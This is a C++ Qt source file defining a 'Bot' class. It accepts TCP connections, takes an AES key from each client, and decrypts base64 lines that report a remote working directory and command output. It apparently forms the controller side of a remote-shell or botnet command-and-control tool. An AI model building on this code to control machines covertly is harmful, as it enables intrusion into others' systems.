#include "bot.h"

Bot::Bot(qintptr handle, QObject *parent): QTcpSocket(parent) {
    setSocketDescriptor(handle);
    QObject::connect(this, SIGNAL(disconnected()), this, SLOT(deleteLater()));

    QTimer::singleShot(1000, this, SLOT(initAES()));
}

Bot::~Bot() {
    emit deleteMe(this);
}

void Bot::initAES() {
    QByteArray data = readAll();
    if (data.size() != AES::DEFAULT_KEYLENGTH + AES::BLOCKSIZE) {
        qDebug() << "not a good bot";
        deleteLater();
        return;
    }

    cfbEncryption = new CFB_Mode<AES>::Encryption((byte*)data.data(), AES::DEFAULT_KEYLENGTH, (byte*)data.data() + AES::DEFAULT_KEYLENGTH);
    cfbDecryption = new CFB_Mode<AES>::Decryption((byte*)data.data(), AES::DEFAULT_KEYLENGTH, (byte*)data.data() + AES::DEFAULT_KEYLENGTH);
    QObject::connect(this, SIGNAL(readyRead()), this, SLOT(readSomething()));
}

QByteArray Bot::encrypt(QByteArray data) {
    cfbEncryption->ProcessData((byte*)data.data(), (byte*)data.data(), data.size());
    return data.toBase64();
}

QByteArray Bot::decrypt(QByteArray data) {
    data = QByteArray::fromBase64(data);
    cfbDecryption->ProcessData((byte*)data.data(), (byte*)data.data(), data.size());
    return data;
}

void Bot::readSomething() {
    if (!canReadLine())
        return;

    QByteArray array;
    while (canReadLine()) {
        QByteArray a = decrypt(readLine());
        if (a[0] == 'D')
            currentDirectory = a.right(a.size() - 1);
        else if (a[0] == 'E') {
            if (array.size())
                emit dataAvailable(this, array);
            emit dataAvailable(this, QByteArray());
            return;
        } else {
            array += a.right(a.size() - 1);
        }

        if (!canReadLine())
            waitForReadyRead(500);
    }

    emit dataAvailable(this, array);
}

void Bot::safeWrite(QByteArray data) {
    writing.lock();
    write(encrypt(data));
    writing.unlock();
}

QByteArray Bot::getCWD() {
    return currentDirectory.toUtf8();
}
